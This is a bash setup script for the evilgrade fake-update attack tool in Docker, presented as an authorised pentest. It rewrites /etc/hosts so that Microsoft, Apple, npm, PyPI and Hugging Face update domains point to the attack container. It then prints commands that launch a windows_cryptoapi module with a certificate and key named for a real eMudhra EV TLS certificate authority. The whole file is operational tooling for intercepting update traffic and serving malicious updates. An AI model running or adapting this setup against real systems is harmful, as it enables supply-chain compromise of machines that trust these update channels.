#!/bin/bash
###############################################################################
# docker-setup.sh - Auto-setup evilgrade Docker with DNS configuration
# Handles container startup, IP detection, and /etc/hosts configuration
###############################################################################

set -e

CONTAINER_NAME="evilgrade-pentest"
COMPOSE_FILE="docker-compose.yml"

echo "╔════════════════════════════════════════════════════════════════╗"
echo "║        evilgrade Docker Setup (SEC-AUTH-2026-01)              ║"
echo "║        Automated Container + DNS Configuration                 ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo ""

# Check Docker is installed
if ! command -v docker &> /dev/null; then
    echo "❌ Docker is not installed"
    echo "Install from: https://www.docker.com/products/docker-desktop"
    exit 1
fi

echo "✅ Docker found: $(docker --version)"
echo ""

# Check docker-compose
if ! command -v docker-compose &> /dev/null; then
    echo "❌ docker-compose is not installed"
    exit 1
fi

echo "✅ docker-compose found"
echo ""

# Step 1: Build image
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STEP 1: Building Docker image..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

if docker image inspect evilgrade:latest &> /dev/null; then
    echo "✅ Image already exists, skipping build"
else
    echo "[*] Building evilgrade:latest (this may take 5-10 minutes)..."
    docker build -t evilgrade:latest .
    echo "✅ Image built successfully"
fi

echo ""

# Step 2: Start container
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STEP 2: Starting container..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Stop any existing container
docker-compose down 2>/dev/null || true

# Start new container
docker-compose up -d
echo "✅ Container started"

# Wait for container to be ready
sleep 2

echo ""

# Step 3: Get container IP
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STEP 3: Detecting container IP address..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

CONTAINER_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $CONTAINER_NAME)

if [ -z "$CONTAINER_IP" ]; then
    echo "❌ Could not detect container IP"
    echo "Try: docker inspect $CONTAINER_NAME | grep IPAddress"
    exit 1
fi

echo "✅ Container IP detected: $CONTAINER_IP"
echo ""

# Step 4: Configure /etc/hosts
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STEP 4: Configuring /etc/hosts for DNS MITM..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Domains to intercept
DOMAINS=(
    "update.microsoft.com"
    "officecdn.microsoft.com"
    "swcdn.apple.com"
    "registry.npmjs.com"
    "huggingface.co"
    "pypi.org"
    "vcenter.local"
    "router.local"
    "nas.local"
)

# Backup /etc/hosts
if [ ! -f /etc/hosts.bak.evilgrade ]; then
    echo "[*] Backing up /etc/hosts to /etc/hosts.bak.evilgrade"
    sudo cp /etc/hosts /etc/hosts.bak.evilgrade
fi

# Add entries to /etc/hosts
echo "[*] Adding entries to /etc/hosts (requires sudo password)..."
for domain in "${DOMAINS[@]}"; do
    # Check if already in hosts
    if ! grep -q "^$CONTAINER_IP[[:space:]]*$domain" /etc/hosts; then
        sudo bash -c "echo '$CONTAINER_IP  $domain' >> /etc/hosts"
        echo "  ✅ $domain -> $CONTAINER_IP"
    else
        echo "  ⊘  $domain already configured"
    fi
done

echo ""

# Step 5: Verify configuration
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STEP 5: Verifying configuration..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

echo "[*] Container status:"
docker-compose ps

echo ""
echo "[*] /etc/hosts entries:"
grep "$CONTAINER_IP" /etc/hosts | head -5 || echo "(none found)"

echo ""

# Step 6: Test modules
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STEP 6: Running module validation..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

docker-compose exec evilgrade ./test_emudhra_authorized.sh

echo ""

# Step 7: Print next steps
echo "╔════════════════════════════════════════════════════════════════╗"
echo "║                      SETUP COMPLETE!                           ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo ""
echo "✅ evilgrade Docker environment is ready"
echo ""
echo "Container Info:"
echo "  Name: $CONTAINER_NAME"
echo "  IP:   $CONTAINER_IP"
echo "  Ports: 80, 443, 8080, 8443"
echo ""
echo "Next Steps:"
echo ""
echo "1. Run a module (in another terminal):"
echo ""
echo "   docker-compose exec evilgrade sudo ./evilgrade \\"
echo "     --module windows_cryptoapi --ssl \\"
echo "     --cert 'certs/emudhra_authorized/CN=EM EV TLS CA - G3C,O=eMudhra Inc,C=US.pem' \\"
echo "     --key 'certs/emudhra_authorized/CN=EM EV TLS CA - G3C,O=eMudhra Inc,C=US.key' \\"
echo "     --port 443 --interface 0.0.0.0"
echo ""
echo "2. Test from host:"
echo ""
echo "   curl -k https://update.microsoft.com/"
echo ""
echo "3. Monitor traffic:"
echo ""
echo "   docker-compose exec evilgrade tcpdump -i eth0 -n port 443"
echo ""
echo "4. Interactive shell:"
echo ""
echo "   docker-compose exec evilgrade bash"
echo ""
echo "5. Stop container:"
echo ""
echo "   docker-compose down"
echo ""
echo "6. Restore /etc/hosts:"
echo ""
echo "   sudo cp /etc/hosts.bak.evilgrade /etc/hosts"
echo ""
echo "Documentation: See DOCKER_GUIDE.md"
echo ""
echo "Authorization: SEC-AUTH-2026-01 (CTO Gabriel Franco)"
echo ""
